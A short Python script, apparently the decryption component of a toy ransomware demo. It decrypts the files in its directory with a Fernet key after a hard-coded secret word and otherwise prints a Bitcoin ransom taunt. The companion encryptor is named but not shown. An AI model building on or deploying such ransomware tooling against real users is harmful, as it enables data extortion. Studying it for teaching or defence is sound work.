#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

# Let's find some files

files = []

for file in os.listdir():
	if file == "pain.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

with open("thekey.key", "rb") as key:
	secretkey = key.read()

secretword = "sushi"

user_word = input("Enter the secret word to decrypt your files:\n")

if user_word == secretword:
	for file in files:
		with open(file,"rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("Congrats, your files are decrypted. Enjoy your sushi :D")
else:
	print("Sorry, wrong secret word!! Send me more Bitcoin and I'll reconsider...")
